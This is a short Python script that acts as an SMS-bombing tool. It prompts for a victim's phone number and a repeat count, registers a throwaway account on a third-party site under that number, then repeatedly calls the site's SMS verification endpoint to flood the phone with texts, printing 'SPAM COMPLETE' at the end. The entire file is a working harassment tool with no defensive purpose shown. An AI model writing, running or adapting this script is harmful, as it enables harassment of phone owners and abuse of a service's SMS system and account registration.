import requests, random, time, uuid, json
from faker import Faker  

fake = Faker()

def call_1():
    url = "https://crbbb.com/api/webapi/SmsVerifyCode"
    headers = {'Content-Type': 'application/json;charset=UTF-8', 'Accept': 'application/json, text/plain, */*'}
    try:
        r = requests.get("https://hgzy.bio/#/register?invitationCode=216236311",headers=headers)
        print(r.text)
        data = r.json()  
        random_value = data.get("random", "default_random")
        signature_value = data.get("signature", "default_signature")
    except (requests.RequestException, json.JSONDecodeError):
        print("Error fetching random and signature values.")
        return

    print("Random:", random_value, "\nSignature:", signature_value)

    num = input("<+> Enter spam number: ")
    limit = int(input("<+> Enter spam limit: "))

    name, number = fake.first_name(), str(random.randint(10000, 99999))
    pasx = "".join(random.sample(name + number, len(name + number)))

    url2 = "https://crbbb.com/api/webapi/Register"
    payloadx = {
        "username": f"88{num}",
        "smsvcode": "",
        "registerType": "mobile",
        "pwd": pasx,
        "invitecode": "2983737",
        "domainurl": "hgzy.bio",
        "phonetype": 1,
        "captchaId": "",
        "track": "",
        "deviceId": str(uuid.uuid4()),
        "language": 0,
        "random": random_value,
        "signature": signature_value,
        "timestamp": int(time.time())
    }

    try:
        response = requests.post(url2, headers=headers, json=payloadx)
        print(response.text)
    except requests.RequestException as e:
        print(f"Error: {e}")

    for _ in range(limit):
        payload = {
            "phone": f"88{num}",
            "codeType": 1,
            "language": 0,
            "random": random_value,
            "signature": signature_value,
            "timestamp": int(time.time())
        }
        try:
            response = requests.post(url, headers=headers, json=payload)
            print(response.text)
        except requests.RequestException as e:
            print(f"Error sending request: {e}")

    print("<+> SPAM COMPLETE ✅ ")

call_1()
